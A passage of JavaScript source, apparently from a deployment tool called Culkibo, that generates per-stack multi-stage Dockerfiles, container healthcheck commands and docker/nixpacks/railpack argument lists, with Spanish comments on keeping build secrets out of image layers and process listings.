    const secretMountStr = secretNames.map((id) => `--mount=type=secret,id=${id}`).join(' ');
    const secretMountPrefix = secretMountStr ? `${secretMountStr} ` : '';

    /** Envoltura en memoria para secretos BuildKit en un único RUN (jamás persiste en la capa). */
    const wrapNodeSecretCmd = (cmd) => {
      if (!secretNames.includes('NPM_TOKEN')) return cmd;
      if (strategy.hasNpmrc) {
        return `NPM_TOKEN="$(cat /run/secrets/NPM_TOKEN)" ${cmd}`;
      }
      return `NPM_TOKEN="$(cat /run/secrets/NPM_TOKEN)" sh -c 'printf "//registry.npmjs.org/:_authToken=%s\\n" "$NPM_TOKEN" > /tmp/.ck-npmrc; NPM_CONFIG_USERCONFIG=/tmp/.ck-npmrc ${cmd}; st=$?; rm -f /tmp/.ck-npmrc; exit $st'`;
    };
    const wrapInlineSecrets = (cmd, allowedIds) => {
      const active = allowedIds.filter((id) => secretNames.includes(id));
      if (active.length === 0) return cmd;
      const exports = active.map((id) => `${id}="$(cat /run/secrets/${id})"`).join(' ');
      return `${exports} ${cmd}`;
    };

    const copyManifestLines = [
      pm === 'pnpm' ? 'COPY package.json pnpm-lock.yam[l] pnpm-workspace.yam[l] ./'
        : pm === 'yarn' ? 'COPY package.json yarn.loc[k] .yarnrc.ym[l] ./'
        : pm === 'bun' ? 'COPY package.json bun.loc[k] bun.lock[b] ./'
        : 'COPY package*.json ./',
      ...(wsPath ? [`COPY ${wsPath}/package.json ./${wsPath}/package.json`] : []),
      ...(wsTool === 'turbo' ? ['COPY turbo.jso[n] ./'] : []),
      ...(wsTool === 'nx' ? ['COPY nx.jso[n] ./'] : []),
      ...(strategy.hasNpmrc ? ['COPY .npmrc ./'] : []),
      ...(strategy.hasPatches ? ['COPY patches ./patches'] : []),
      ...(strategy.hasPrisma ? ['COPY prisma ./prisma'] : [])
    ];
    const enableCorepack = (pm === 'pnpm' || pm === 'yarn') ? ['RUN corepack enable'] : [];
    const rawInstallAll = pm === 'pnpm'
      ? 'pnpm install --frozen-lockfile || pnpm install'
      : pm === 'yarn'
      ? 'yarn install --frozen-lockfile || yarn install'
      : pm === 'bun'
      ? 'bun install --frozen-lockfile || bun install'
      : 'npm ci --include=dev --no-audit --no-fund || npm install --include=dev --no-audit --no-fund';
    const rawInstallProd = pm === 'pnpm'
      ? 'pnpm install --prod --ignore-scripts --frozen-lockfile || pnpm install --prod --ignore-scripts'
      : pm === 'yarn'
      ? 'yarn install --production --ignore-scripts --frozen-lockfile || yarn install --production --ignore-scripts'
      : pm === 'bun'
      ? 'bun install --production --ignore-scripts'
      : 'npm ci --omit=dev --ignore-scripts --no-audit --no-fund || npm install --omit=dev --ignore-scripts --no-audit --no-fund';
    const pmCacheMount = pm === 'pnpm'
      ? '--mount=type=cache,id=culkibo-pnpm,sharing=locked,target=/root/.local/share/pnpm/store'
      : pm === 'yarn'
      ? '--mount=type=cache,id=culkibo-yarn,sharing=locked,target=/usr/local/share/.cache/yarn'
      : pm === 'bun'
      ? '--mount=type=cache,id=culkibo-bun,sharing=locked,target=/root/.bun/install/cache'
      : '--mount=type=cache,id=culkibo-npm,sharing=locked,target=/root/.npm';

    const installAllCmd = `RUN ${pmCacheMount} ${secretMountPrefix}${wrapNodeSecretCmd(rawInstallAll)}`;
    const installProdCmd = `RUN ${pmCacheMount} ${secretMountPrefix}${wrapNodeSecretCmd(rawInstallProd)}`;

    let runBuildCmd;
    if (wsPath) {
      if (wsTool === 'turbo' && wsPkg) {
        const execPrefix = pm === 'pnpm' ? 'pnpm exec' : pm === 'yarn' ? 'yarn' : pm === 'bun' ? 'bunx' : 'npx';
        runBuildCmd = `${execPrefix} turbo run build --filter=${wsPkg}...`;
      } else if (wsTool === 'nx' && wsPkg) {
        const execPrefix = pm === 'pnpm' ? 'pnpm exec' : pm === 'yarn' ? 'yarn' : pm === 'bun' ? 'bunx' : 'npx';
        runBuildCmd = `${execPrefix} nx build ${wsPkg}`;
      } else if (pm === 'pnpm') {
        runBuildCmd = `pnpm --filter ${wsPkg || `./${wsPath}`} run build`;
      } else if (pm === 'yarn') {
        runBuildCmd = `yarn --cwd ${wsPath} build`;
      } else if (pm === 'bun') {
        runBuildCmd = `bun --cwd ${wsPath} run build`;
      } else {
        runBuildCmd = `npm --workspace=${wsPath} run build`;
      }
    } else {
      runBuildCmd = pm === 'pnpm' ? 'pnpm run build' : pm === 'yarn' ? 'yarn build' : pm === 'bun' ? 'bun run build' : 'npm run build';
    }
    const startArgv = pm === 'pnpm' ? '["pnpm", "run", "start"]' : pm === 'yarn' ? '["yarn", "start"]' : pm === 'bun' ? '["bun", "run", "start"]' : '["npm", "run", "start"]';
    const appBase = wsPath ? `/app/${wsPath}` : '/app';

    // Configuración de nginx para SPA/estático respetando siempre `strategy.containerPort`
    const spaConf = `RUN printf 'server {\\n  listen ${port};\\n  root /usr/share/nginx/html;\\n  index index.html;\\n  location / { try_files $uri $uri/ /index.html; }\\n}\\n' > /etc/nginx/conf.d/default.conf`;

    if (strategy.stack === 'next') {
      const isStandalone = strategy.nextOutput === 'standalone';
      const standaloneEntry = wsPath ? `${wsPath}/server.js` : 'server.js';
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        `FROM ${baseImage} AS deps`,
        'RUN apk add --no-cache libc6-compat',
        'WORKDIR /app',
        ...enableCorepack,
        ...(wsPath ? ['COPY . .'] : copyManifestLines),
        installAllCmd,
        '',
        `FROM ${baseImage} AS build`,
        'RUN apk add --no-cache libc6-compat',
        'WORKDIR /app',
        ...enableCorepack,
        ...buildArgDecls,
        'COPY --from=deps /app/node_modules ./node_modules',
        'COPY . .',
        'ENV NEXT_TELEMETRY_DISABLED=1',
        `RUN --mount=type=cache,id=culkibo-next-${cacheScope},sharing=locked,target=${appBase}/.next/cache ${secretMountPrefix}${runBuildCmd}`,
        '',
        `FROM ${baseImage} AS runtime`,
        'RUN apk add --no-cache libc6-compat',
        'WORKDIR /app',
        ...enableCorepack,
        'ENV NODE_ENV=production',
        'ENV HOSTNAME=0.0.0.0',
        `ENV PORT=${port}`,
        'RUN addgroup -S culkibo && adduser -S culkibo -G culkibo',
        ...(isStandalone
          ? [
              `COPY --from=build --chown=culkibo:culkibo ${appBase}/.next/standalone ./`,
              `COPY --from=build --chown=culkibo:culkibo ${appBase}/.next/static ./${wsPath ? `${wsPath}/` : ''}.next/static`,
              `COPY --from=build --chown=culkibo:culkibo ${appBase}/public ./${wsPath ? `${wsPath}/` : ''}public`
            ]
          : ['COPY --from=build --chown=culkibo:culkibo /app ./']),
        ...(!isStandalone && wsPath ? [`WORKDIR /app/${wsPath}`] : []),
        'USER culkibo',
        `EXPOSE ${port}`,
        isStandalone ? `CMD ["${jsRuntimeBin}", "${standaloneEntry}"]` : `CMD ${startArgv}`,
        ''
      ].join('\n');
    }

    if (strategy.stack === 'nuxt') {
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        `FROM ${baseImage} AS build`,
        'WORKDIR /app',
        ...enableCorepack,
        ...(wsPath ? ['COPY . .'] : copyManifestLines),
        installAllCmd,
        ...buildArgDecls,
        ...(!wsPath ? ['COPY . .'] : []),
        `RUN --mount=type=cache,id=culkibo-nuxt-${cacheScope},sharing=locked,target=${appBase}/.nuxt ${secretMountPrefix}${runBuildCmd}`,
        '',
        `FROM ${baseImage} AS runtime`,
        'WORKDIR /app',
        'ENV NODE_ENV=production',
        'ENV NITRO_HOST=0.0.0.0',
        `ENV NITRO_PORT=${port}`,
        'ENV HOST=0.0.0.0',
        `ENV PORT=${port}`,
        'RUN addgroup -S culkibo && adduser -S culkibo -G culkibo',
        `COPY --from=build --chown=culkibo:culkibo ${appBase}/.output ./.output`,
        'USER culkibo',
        `EXPOSE ${port}`,
        `CMD ["${jsRuntimeBin}", ".output/server/index.mjs"]`,
        ''
      ].join('\n');
    }

    if (strategy.stack === 'sveltekit' || strategy.stack === 'astro-ssr') {
      const isAstro = strategy.stack === 'astro-ssr';
      const artifactDir = isAstro ? 'dist' : 'build';
      const entryFile = isAstro ? 'dist/server/entry.mjs' : 'build/index.js';
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        `FROM ${baseImage} AS deps`,
        'WORKDIR /app',
        ...enableCorepack,
        ...(wsPath ? ['COPY . .'] : copyManifestLines),
        installAllCmd,
        '',
        `FROM ${baseImage} AS prod-deps`,
        'WORKDIR /app',
        ...enableCorepack,
        ...(wsPath ? ['COPY . .'] : copyManifestLines),
        installProdCmd,
        '',
        `FROM ${baseImage} AS build`,
        'WORKDIR /app',
        ...enableCorepack,
        ...buildArgDecls,
        'COPY --from=deps /app/node_modules ./node_modules',
        'COPY . .',
        `RUN --mount=type=cache,id=culkibo-${strategy.stack}-${cacheScope},sharing=locked,target=${appBase}/node_modules/.vite ${secretMountPrefix}${runBuildCmd}`,
        '',
        `FROM ${baseImage} AS runtime`,
        'WORKDIR /app',
        'ENV NODE_ENV=production',
        'ENV HOST=0.0.0.0',
        `ENV PORT=${port}`,
        'RUN addgroup -S culkibo && adduser -S culkibo -G culkibo',
        `COPY --from=build --chown=culkibo:culkibo ${appBase}/${artifactDir} ./${artifactDir}`,
        `COPY --from=build --chown=culkibo:culkibo ${appBase}/package.json ./package.json`,
        'COPY --from=prod-deps --chown=culkibo:culkibo /app/node_modules ./node_modules',
        'USER culkibo',
        `EXPOSE ${port}`,
        `CMD ["${jsRuntimeBin}", "${entryFile}"]`,
        ''
      ].join('\n');
    }

    if (strategy.stack === 'vite') {
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        `FROM ${baseImage} AS build`,
        'WORKDIR /app',
        ...enableCorepack,
        ...(wsPath ? ['COPY . .'] : copyManifestLines),
        installAllCmd,
        // Declarar build args DESPUÉS de instalar dependencias para no invalidar la caché de `npm ci`
        ...buildArgDecls,
        ...(!wsPath ? ['COPY . .'] : []),
        `RUN --mount=type=cache,id=culkibo-vite-${cacheScope},sharing=locked,target=${appBase}/node_modules/.vite ${secretMountPrefix}${runBuildCmd}`,
        '',
        'FROM nginx:1.27-alpine AS runtime',
        spaConf,
        `COPY --from=build ${appBase}/${outputDir} /usr/share/nginx/html`,
        `EXPOSE ${port}`,
        'CMD ["nginx", "-g", "daemon off;"]',
        ''
      ].join('\n');
    }

    if (strategy.stack === 'node') {
      const buildStep = strategy.buildScript ? `RUN ${secretMountPrefix}${runBuildCmd}` : '# sin script de build';
      const startCmd = strategy.startCommand
        ? `CMD ${startArgv}`
        : `CMD ["${jsRuntimeBin}", "."]`;
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        `FROM ${baseImage} AS deps`,
        'WORKDIR /app',
        ...enableCorepack,
        ...(wsPath ? ['COPY . .'] : copyManifestLines),
        installAllCmd,
        '',
        `FROM ${baseImage} AS prod-deps`,
        'WORKDIR /app',
        ...enableCorepack,
        ...(wsPath ? ['COPY . .'] : copyManifestLines),
        installProdCmd,
        ...(strategy.hasPrisma ? ['RUN npx prisma generate || true'] : []),
        '',
        `FROM ${baseImage} AS build`,
        'WORKDIR /app',
        ...enableCorepack,
        ...buildArgDecls,
        'COPY --from=deps /app/node_modules ./node_modules',
        'COPY . .',
        buildStep,
        'RUN rm -rf /app/node_modules',
        '',
        `FROM ${baseImage} AS runtime`,
        'WORKDIR /app',
        ...enableCorepack,
        'ENV NODE_ENV=production',
        'ENV HOSTNAME=0.0.0.0',
        `ENV PORT=${port}`,
        'RUN addgroup -S culkibo && adduser -S culkibo -G culkibo',
        'COPY --from=build --chown=culkibo:culkibo /app ./',
        'COPY --from=prod-deps --chown=culkibo:culkibo /app/node_modules ./node_modules',
        ...(wsPath ? [`WORKDIR /app/${wsPath}`] : []),
        'USER culkibo',
        `EXPOSE ${port}`,
        startCmd,
        ''
      ].join('\n');
    }

    if (strategy.stack === 'go') {
      const goTarget = /^\.(?:\/[A-Za-z0-9._-]+)*$/.test(String(strategy.goBuildTarget || '.')) ? strategy.goBuildTarget : '.';
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        'FROM golang:1.23-alpine AS build',
        'ENV GOTOOLCHAIN=auto',
        'WORKDIR /app',
        ...buildArgDecls,
        'COPY go.mod go.su[m] ./',
        `RUN --mount=type=cache,id=culkibo-gomod,sharing=locked,target=/go/pkg/mod ${secretMountPrefix}${wrapInlineSecrets('go mod download', ['GITHUB_TOKEN', 'GIT_AUTH_TOKEN'])}`,
        'COPY . .',
        `RUN --mount=type=cache,id=culkibo-gomod,sharing=locked,target=/go/pkg/mod --mount=type=cache,id=culkibo-gobuild-${cacheScope},sharing=locked,target=/root/.cache/go-build ${secretMountPrefix}CGO_ENABLED=0 go build -trimpath -ldflags="-s -w" -o /app/server ${goTarget}`,
        '',
        'FROM alpine:3.21 AS runtime',
        'RUN apk add --no-cache ca-certificates tzdata',
        'WORKDIR /app',
        'RUN addgroup -S culkibo && adduser -S culkibo -G culkibo',
        'COPY --from=build --chown=culkibo:culkibo /app/server /app/server',
        'USER culkibo',
        `ENV PORT=${port}`,
        `EXPOSE ${port}`,
        'CMD ["/app/server"]',
        ''
      ].join('\n');
    }

    if (strategy.stack === 'rust') {
      const rustBin = /^[A-Za-z0-9_-]{1,64}$/.test(String(strategy.rustBinary || '')) ? strategy.rustBinary : null;
      const copyBinCmd = rustBin
        ? `cp /app/target/release/${rustBin} /app/server`
        : 'find /app/target/release -maxdepth 1 -type f -executable ! -name "*.so" ! -name "*.d" -exec cp {} /app/server \\; -quit';
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        'FROM rust:1.85-alpine AS build',
        'RUN apk add --no-cache musl-dev pkgconfig openssl-dev openssl-libs-static',
        'WORKDIR /app',
        ...buildArgDecls,
        'COPY Cargo.toml Cargo.loc[k] ./',
        'COPY . .',
        `RUN --mount=type=cache,id=culkibo-cargo-reg,sharing=locked,target=/usr/local/cargo/registry --mount=type=cache,id=culkibo-cargo-git,sharing=locked,target=/usr/local/cargo/git --mount=type=cache,id=culkibo-rust-target-${cacheScope},sharing=locked,target=/app/target ${secretMountPrefix}${wrapInlineSecrets('cargo build --release --locked || cargo build --release', ['CARGO_REGISTRY_TOKEN', 'CARGO_REGISTRIES_CRATES_IO_TOKEN'])} && ${copyBinCmd}`,
        '',
        'FROM alpine:3.21 AS runtime',
        'RUN apk add --no-cache ca-certificates tzdata libgcc',
        'WORKDIR /app',
        'RUN addgroup -S culkibo && adduser -S culkibo -G culkibo',
        'COPY --from=build --chown=culkibo:culkibo /app/server /app/server',
        'USER culkibo',
        `ENV PORT=${port}`,
        `EXPOSE ${port}`,
        'CMD ["/app/server"]',
        ''
      ].join('\n');
    }

    if (strategy.stack === 'deno') {
      const rawEntry = String(strategy.denoEntry || 'main.ts');
      const denoEntry = (!rawEntry.includes('..') && /^[A-Za-z0-9._/-]{1,128}\.(?:ts|tsx|js|mjs)$/.test(rawEntry))
        ? rawEntry
        : 'main.ts';
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        'FROM denoland/deno:alpine-2.2.4 AS runtime',
        'WORKDIR /app',
        ...buildArgDecls,
        'RUN addgroup -S culkibo && adduser -S culkibo -G culkibo',
        'COPY --chown=culkibo:culkibo . .',
        `RUN --mount=type=cache,id=culkibo-deno,sharing=locked,target=/deno-dir ${secretMountPrefix}deno cache ${denoEntry}`,
        'USER culkibo',
        `ENV PORT=${port}`,
        `EXPOSE ${port}`,
        `CMD ["deno", "run", "--allow-net", "--allow-env", "--allow-read", "${denoEntry}"]`,
        ''
      ].join('\n');
    }

    if (strategy.stack === 'php') {
      const docRoot = strategy.phpDocRoot === 'public' ? '/app/public' : '/app';
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        'FROM composer:2.8 AS deps',
        'WORKDIR /app',
        'COPY composer.json composer.loc[k] ./',
        `RUN --mount=type=cache,id=culkibo-composer,sharing=locked,target=/tmp/cache ${secretMountPrefix}${wrapInlineSecrets('composer install --no-dev --no-interaction --no-scripts --prefer-dist --optimize-autoloader', ['COMPOSER_AUTH'])}`,
        '',
        'FROM dunglas/frankenphp:1-php8.3-alpine AS runtime',
        'WORKDIR /app',
        'RUN addgroup -S culkibo && adduser -S culkibo -G culkibo',
        'COPY --chown=culkibo:culkibo . .',
        'COPY --from=deps --chown=culkibo:culkibo /app/vendor ./vendor',
        ...(strategy.isLaravel ? ['RUN mkdir -p storage/framework/cache storage/framework/sessions storage/framework/views bootstrap/cache && chown -R culkibo:culkibo storage bootstrap/cache'] : []),
        `ENV SERVER_NAME=:${port}`,
        `ENV PORT=${port}`,
        'USER culkibo',
        `EXPOSE ${port}`,
        `CMD ["frankenphp", "php-server", "--listen", ":${port}", "--root", "${docRoot}"]`,
        ''
      ].join('\n');
    }

    if (strategy.stack === 'elixir') {
      const appName = /^[a-z][a-z0-9_]{0,63}$/.test(String(strategy.elixirApp || '')) ? strategy.elixirApp : 'app';
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        'FROM elixir:1.17-otp-27-alpine AS build',
        'RUN apk add --no-cache build-base git',
        'ENV MIX_ENV=prod',
        'WORKDIR /app',
        ...buildArgDecls,
        'RUN mix local.hex --force && mix local.rebar --force',
        'COPY mix.exs mix.loc[k] ./',
        `RUN --mount=type=cache,id=culkibo-hex,sharing=locked,target=/root/.hex --mount=type=cache,id=culkibo-mix,sharing=locked,target=/root/.mix ${secretMountPrefix}mix deps.get --only prod && mix deps.compile`,
        'COPY . .',
        `RUN --mount=type=cache,id=culkibo-hex,sharing=locked,target=/root/.hex ${secretMountPrefix}mix compile && mix release ${appName}`,
        '',
        'FROM alpine:3.21 AS runtime',
        'RUN apk add --no-cache libstdc++ openssl ncurses-libs ca-certificates tzdata',
        'WORKDIR /app',
        'RUN addgroup -S culkibo && adduser -S culkibo -G culkibo',
        `COPY --from=build --chown=culkibo:culkibo /app/_build/prod/rel/${appName} ./`,
        'USER culkibo',
        `ENV PORT=${port}`,
        `EXPOSE ${port}`,
        `CMD ["/app/bin/${appName}", "start"]`,
        ''
      ].join('\n');
    }

    if (strategy.stack === 'java') {
      const isGradle = strategy.javaBuildTool === 'gradle';
      const buildImage = isGradle
        ? (strategy.javaHasWrapper ? 'eclipse-temurin:21-jdk-alpine' : 'gradle:8.12-jdk21-alpine')
        : (strategy.javaHasWrapper ? 'eclipse-temurin:21-jdk-alpine' : 'maven:3.9-eclipse-temurin-21-alpine');
      const cacheFlag = isGradle
        ? '--mount=type=cache,id=culkibo-gradle,sharing=locked,target=/root/.gradle'
        : '--mount=type=cache,id=culkibo-m2,sharing=locked,target=/root/.m2';
      const compileCmd = isGradle
        ? (strategy.javaHasWrapper ? 'chmod +x ./gradlew && ./gradlew build -x test --no-daemon' : 'gradle build -x test --no-daemon')
        : (strategy.javaHasWrapper ? 'chmod +x ./mvnw && ./mvnw package -DskipTests -B' : 'mvn package -DskipTests -B');
      const jarGlob = isGradle ? 'build/libs/*.jar' : 'target/*.jar';
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        `FROM ${buildImage} AS build`,
        'WORKDIR /app',
        ...buildArgDecls,
        'COPY . .',
        `RUN ${cacheFlag} ${secretMountPrefix}${compileCmd} && sh -c 'JAR=$(ls -S ${jarGlob} | grep -v "plain\\.jar$" | head -n 1); cp "$JAR" /app/app.jar'`,
        '',
        'FROM eclipse-temurin:21-jre-alpine AS runtime',
        'RUN apk add --no-cache ca-certificates tzdata',
        'WORKDIR /app',
        'RUN addgroup -S culkibo && adduser -S culkibo -G culkibo',
        'COPY --from=build --chown=culkibo:culkibo /app/app.jar /app/app.jar',
        'USER culkibo',
        `ENV PORT=${port}`,
        'ENV JAVA_OPTS="-XX:+UseContainerSupport -XX:MaxRAMPercentage=75.0"',
        `EXPOSE ${port}`,
        'CMD ["java", "-XX:+UseContainerSupport", "-XX:MaxRAMPercentage=75.0", "-jar", "/app/app.jar"]',
        ''
      ].join('\n');
    }

    if (strategy.stack === 'python') {
      const entry = /^[A-Za-z0-9._-]+\.py$/.test(String(strategy.pythonEntry || '')) ? strategy.pythonEntry : 'main.py';
      const pyPm = strategy.pythonPackageManager === 'uv' || strategy.pythonPackageManager === 'poetry'
        ? strategy.pythonPackageManager
        : 'pip';
      const startCmdLine = Array.isArray(strategy.pythonStartCmd) && strategy.pythonStartCmd.length > 0
        ? `CMD ${JSON.stringify(strategy.pythonStartCmd.map((tok) => tok === '8000' ? String(port) : tok.replace(':8000', `:${port}`)))}`
        : `CMD ["python", "${entry}"]`;
      const pySecretKeys = ['PIP_INDEX_URL', 'PIP_EXTRA_INDEX_URL', 'UV_INDEX_URL', 'UV_EXTRA_INDEX_URL', 'UV_INDEX_PRIVATE_PASSWORD'];

      if (pyPm === 'uv') {
        return [
          '# syntax=docker/dockerfile:1.7',
          '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
          'FROM python:3.12-slim AS runtime',
          'COPY --from=ghcr.io/astral-sh/uv:0.6 /uv /uvx /usr/local/bin/',
          'WORKDIR /app',
          'ENV PYTHONUNBUFFERED=1',
          `ENV PORT=${port}`,
          'ENV PATH="/app/.venv/bin:$PATH"',
          ...buildArgDecls,
          'RUN useradd --create-home --shell /usr/sbin/nologin culkibo',
          'COPY pyproject.toml uv.lock ./',
          `RUN --mount=type=cache,id=culkibo-uv,sharing=locked,target=/root/.cache/uv ${secretMountPrefix}${wrapInlineSecrets('uv sync --frozen --no-dev --no-install-project', pySecretKeys)}`,
          'COPY --chown=culkibo:culkibo . .',
          `RUN --mount=type=cache,id=culkibo-uv,sharing=locked,target=/root/.cache/uv ${secretMountPrefix}${wrapInlineSecrets('uv sync --frozen --no-dev', pySecretKeys)} && chown -R culkibo:culkibo /app/.venv`,
          'USER culkibo',
          `EXPOSE ${port}`,
          startCmdLine,
          ''
        ].join('\n');
      }

      if (pyPm === 'poetry') {
        return [
          '# syntax=docker/dockerfile:1.7',
          '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
          'FROM python:3.12-slim AS runtime',
          'WORKDIR /app',
          'ENV PYTHONUNBUFFERED=1',
          'ENV POETRY_VIRTUALENVS_IN_PROJECT=true',
          'ENV POETRY_NO_INTERACTION=1',
          `ENV PORT=${port}`,
          'ENV PATH="/app/.venv/bin:$PATH"',
          ...buildArgDecls,
          'RUN useradd --create-home --shell /usr/sbin/nologin culkibo && pip install --no-cache-dir poetry',
          'COPY pyproject.toml poetry.loc[k] ./',
          `RUN --mount=type=cache,id=culkibo-poetry,sharing=locked,target=/root/.cache/pypoetry ${secretMountPrefix}${wrapInlineSecrets('poetry install --only main --no-root', pySecretKeys)}`,
          'COPY --chown=culkibo:culkibo . .',
          'RUN chown -R culkibo:culkibo /app/.venv',
          'USER culkibo',
          `EXPOSE ${port}`,
          startCmdLine,
          ''
        ].join('\n');
      }

      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        'FROM python:3.12-slim AS runtime',
        'WORKDIR /app',
        'ENV PYTHONUNBUFFERED=1',
        `ENV PORT=${port}`,
        ...buildArgDecls,
        'RUN useradd --create-home --shell /usr/sbin/nologin culkibo',
        'COPY requirements.tx[t] pyproject.tom[l] ./',
        `RUN --mount=type=cache,id=culkibo-pip,sharing=locked,target=/root/.cache/pip ${secretMountPrefix}${wrapInlineSecrets('if [ -f requirements.txt ]; then pip install --no-cache-dir -r requirements.txt; fi', pySecretKeys)}`,
        'COPY --chown=culkibo:culkibo . .',
        `RUN --mount=type=cache,id=culkibo-pip,sharing=locked,target=/root/.cache/pip ${secretMountPrefix}${wrapInlineSecrets('if [ ! -f requirements.txt ] && [ -f pyproject.toml ]; then pip install --no-cache-dir .; fi', pySecretKeys)}`,
        'USER culkibo',
        `EXPOSE ${port}`,
        startCmdLine,
        ''
      ].join('\n');
    }

    if (strategy.stack === 'static') {
      const root = outputDir === '.' ? '.' : outputDir;
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        'FROM nginx:1.27-alpine AS runtime',
        spaConf,
        `COPY ${root} /usr/share/nginx/html`,
        `EXPOSE ${port}`,
        'CMD ["nginx", "-g", "daemon off;"]',
        ''
      ].join('\n');
    }

    return null;
  }

  /**
   * Orden de `--health-cmd` para las imágenes que generamos nosotros.
   *
   * Solo se inyecta en imágenes propias, donde sabemos qué binarios hay dentro.
   * En una imagen ajena un healthcheck que no puede ejecutarse la marcaría
   * `unhealthy` para siempre y estaríamos mintiendo sobre su estado.
   */
  healthCommandFor(strategy) {
    const port = sanitizePort(strategy.containerPort, DEFAULTS.containerPort);
    const p = sanitizeHealthPath(strategy.healthPath) || '/';
    const url = `http://127.0.0.1:${port}${p}`;
    if (
      strategy.stack === 'vite' || strategy.stack === 'static' || strategy.stack === 'go' ||
      strategy.stack === 'rust' || strategy.stack === 'php' || strategy.stack === 'elixir' || strategy.stack === 'java'
    ) {
      // Aceptar cualquier estado HTTP < 500 (igual que waitForHealth), incluso 401/404 en APIs
      return `wget --spider -S ${url} 2>&1 | awk '/HTTP\\//{c=$2} END{exit !(c>=100 && c<500)}'`;
    }
    if (strategy.stack === 'deno') {
      return `deno eval "fetch('${url}').then(r=>Deno.exit(r.status<500?0:1)).catch(()=>Deno.exit(1))"`;
    }
    if (strategy.stack === 'python') {
      // P1-31: capturar HTTPError para que APIs que devuelven 401/404 en '/' se consideren sanas (< 500)
      return `python -c "import urllib.request,urllib.error,sys\ntry:\n r=urllib.request.urlopen('${url}')\n sys.exit(0 if r.status<500 else 1)\nexcept urllib.error.HTTPError as e:\n sys.exit(0 if e.code<500 else 1)"`;
    }
    const jsBin = strategy.packageManager === 'bun' ? 'bun' : 'node';
    return `${jsBin} -e "fetch('${url}').then(r=>process.exit(r.status<500?0:1)).catch(()=>process.exit(1))"`;
  }

  // -------------------------------------------------------------------------
  // 3. Construcción de argv
  // -------------------------------------------------------------------------

  /**
   * Argumentos de `docker build`.
   *
   * DETERMINISTA A PROPÓSITO: para la misma entrada devuelve exactamente el
   * mismo array. Ni marcas de tiempo, ni nonces, ni `--build-arg CACHEBUST`.
   * Ese es el fallo #7040 de Coolify y la prueba lo vigila.
   */
  /**
   * @param {{imageTag: string, contextDir: string, dockerfile?: string | null, buildArgNames?: string[], secretNames?: string[], labels?: Record<string, any>}} spec
   * @returns {string[]}
   */
  buildArgs({ imageTag, contextDir, dockerfile = null, buildArgNames = [], secretNames = [], labels = {} }) {
    const args = ['build', '--progress=plain', '-t', imageTag];

    if (dockerfile) {
      args.push('-f', path.join(contextDir, dockerfile));
    }

    // Solo NOMBRES. El valor lo toma docker del entorno del proceso hijo, así
    // que un secreto de build nunca aparece en `ps` ni en el log de build.
    for (const name of buildArgNames) {
      if (isValidEnvName(name)) args.push('--build-arg', name);
    }

    // Secretos BuildKit (`--secret id=NAME,env=NAME`): nunca entran en capas ni
    // en `docker history`, y el valor viaja solo en el entorno del hijo.
    for (const name of normalizeBuildSecretNames(secretNames)) {
      args.push('--secret', `id=${name},env=${name}`);
    }

    // Las etiquetas se escriben en la configuración de la imagen al final; no
    // invalidan la caché de capas (a diferencia de un ARG).
    for (const [key, value] of Object.entries(labels)) {
      if (/^[a-z0-9.\-_]+$/i.test(key)) args.push('--label', `${key}=${String(value).replace(/\s+/g, ' ').slice(0, 200)}`);
    }

    args.push(contextDir);
    return args;
  }

  /**
   * Argumentos de `railpack build` / `nixpacks build`.
   *
   * Los dos toman el directorio como argumento posicional y la etiqueta en
   * `--name`. Donde se separan es en los secretos:
   *
   *   - Nixpacks acepta `--env NOMBRE` a secas y, cita literal de su
   *     documentación, «si no hay signo igual el valor se toma del entorno
   *     actual». Esa es exactamente la forma que necesitamos: el nombre en
   *     argv, el valor en el entorno del hijo.
   *   - Railpack SOLO acepta `--env CLAVE=VALOR`. Pasar un secreto por ahí lo
   *     deja visible en `ps` para cualquier usuario de la máquina, así que a
   *     railpack no se le pasa ninguna variable. Un build que necesite secretos
   *     debe traer su propio Dockerfile.
   */
  /**
   * @param {string} builder
   * @param {{imageTag: string, contextDir: string, envNames?: string[]}} spec
   * @returns {string[]}
   */
  externalBuilderArgs(builder, { imageTag, contextDir, envNames = [] }) {
    if (builder === 'railpack') {
      return ['build', contextDir, '--name', imageTag, '--progress', 'plain'];
    }
    const args = ['build', contextDir, '--name', imageTag];
    for (const name of envNames) {
      if (isValidEnvName(name)) args.push('--env', name);
    }
    return args;
  }

  /**
   * Argumentos de `docker run`.
   *
   * Los valores de las variables de entorno NO están aquí: `-e CLAVE` sin `=`
   * hace que docker lea el valor del entorno del proceso que lo lanza. Es la
   * diferencia entre un secreto visible en `ps` para cualquier usuario de la
   * máquina y un secreto que solo ve el hijo.
   */
  /**
   * @param {{containerName: string, imageTag: string, hostPort: number, containerPort: number,
   *   envNames?: string[], envFile?: string | null, network?: string | null, memoryMb?: number, cpus?: string | number,
   *   pidsLimit?: number, healthCmd?: string | null, healthStartPeriodSec?: number, healthRetries?: number,
